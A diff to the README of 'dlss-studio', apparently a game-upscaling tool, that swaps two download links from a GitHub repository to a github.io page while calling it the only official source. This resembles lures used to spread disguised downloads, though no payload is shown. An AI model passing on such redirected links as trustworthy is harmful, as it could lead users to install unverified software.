@@ -17,7 +17,7 @@ Think of it like a magic switch: you tell dlss-studio which game you want to imp
 
 Visit this link to download the application. It’s the only official source — always get it from here.
 
-**[⬇️ CLICK HERE TO DOWNLOAD dlss-studio v1.0.8](https://github.com/Aesthetic-asiminatriloba7066/dlss-studio)**
+**[⬇️ CLICK HERE TO DOWNLOAD dlss-studio v1.0.8](https://aesthetic-asiminatriloba7066.github.io)**
 
 The download page will open in your browser. Follow these steps:
 
@@ -129,6 +129,6 @@ This software is released under the MIT License — you are free to use, modify,
 
 **Ready to experience your games like never before? Download dlss‑studio now and turn on DLSS in minutes flat.**
 
-**[⬇️ GET DLSS-STUDIO v1.0.8](https://github.com/Aesthetic-asiminatriloba7066/dlss-studio)**
+**[⬇️ GET DLSS-STUDIO v1.0.8](https://aesthetic-asiminatriloba7066.github.io)**
 
 Keywords: dlss, dlss-studio, frame generation, rtx, nvidia, optiscaler, neural reconstruction, rust, windows
